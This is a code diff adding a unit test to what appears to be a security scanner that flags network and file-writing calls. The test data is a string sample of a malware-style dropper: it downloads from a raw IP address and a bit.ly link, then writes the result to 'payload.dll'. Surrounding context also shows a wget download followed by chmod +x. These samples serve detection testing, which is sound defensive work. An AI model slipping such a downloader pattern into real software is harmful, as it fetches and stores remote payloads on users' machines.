@@ -359,3 +359,31 @@ def test_unlinked_shell_commands_remain_separate_evidence():
     assert [e.raw_text for e in commands] == [
         'wget https://example.test/bootstrap -O ./setup', 'chmod +x setup'
     ]
+
+
+def test_urllib_urlopen_is_a_complete_api_call_in_python_sibling():
+    source = (
+        "import urllib.request\n"
+        "CONFIG_SERVER = 'http://142.111.77.196/user/user.asp?id=237596'\n"
+        "BITLY_REDIRECT = 'https://bit.ly/3c2tMTT'\n"
+        "def download_config(url, output_path):\n"
+        "    with urllib.request.urlopen(url, timeout=30) as response:\n"
+        "        data = response.read()\n"
+        "        with open(output_path, 'wb') as f:\n"
+        "            f.write(data)\n"
+        "    with open('payload.dll', 'wb') as f:\n"
+        "        f.write(data)\n"
+    )
+    result = SkillAnalyzer().scan(source, filename="scripts/1k-defi-init.py", source_id="5962937")
+    assert result.rule_counts() == {"NET-001": 2, "NET-002": 1, "FS-002": 2}
+    calls = [e for e in result.evidence if "NET-002" in e.rule_ids]
+    assert len(calls) == 1
+    call, = calls
+    assert call.kind == "api_call"
+    assert call.raw_text == "urllib.request.urlopen(url, timeout=30)"
+    assert call.extraction_status == ExtractionStatus.COMPLETE
+    assert ("call", "urllib.request.urlopen") in call.values
+    assert ("arguments", "url, timeout=30") in call.values
+    assert call.context.kind == "source_code"
+    assert call.filename == "scripts/1k-defi-init.py"
+    assert call.source_id == "5962937"
